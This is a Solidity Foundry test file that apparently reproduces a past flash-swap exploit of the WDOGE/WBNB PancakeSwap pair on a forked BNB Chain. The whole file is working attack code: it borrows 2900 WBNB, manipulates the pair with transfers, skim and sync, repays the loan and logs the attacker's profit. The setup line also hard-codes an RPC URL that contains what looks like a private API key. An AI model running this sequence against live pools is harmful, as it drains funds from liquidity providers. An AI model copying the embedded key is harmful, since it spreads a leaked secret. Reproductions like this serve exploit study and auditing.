// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "./interface.sol";

contract ContractTest is DSTest {

    IWBNB  wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 busd  = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 wdoge  = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    address public  BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 mainnetFork;
    
    function setUp() public {
        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 17248705); //fork bsc at block 17248705
        cheats.selectFork(mainnetFork);
    }
    function  testExploit() public {
        IPancakePair(BUSDT_WBNB_Pair).swap(0,2900 ether, address(this), '0x');
    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{
        emit log_named_uint("After flashswap: WBNB balance of attacker", wbnb.balanceOf(address(this))/1e18);
        wbnb.transfer(wdoge_wbnb, 2900 ether);
        IPancakePair(wdoge_wbnb).swap(6638066501837822413045167240755, 0, address(this), "");
        wdoge.transfer(wdoge_wbnb, 5532718068557297916520398869451);
        IPancakePair(wdoge_wbnb).skim(address(this));
        IPancakePair(wdoge_wbnb).sync();
        wdoge.transfer(wdoge_wbnb, 4466647961091568568393910837883);
        IPancakePair(wdoge_wbnb).swap(0, 2978658352619485704640, address(this), "");
        wbnb.transfer(BUSDT_WBNB_Pair, 2908 ether);
        emit log_named_uint("After repaying flashswap, Profit: WBNB balance of attacker", wbnb.balanceOf(address(this))/1e18);

    }
}
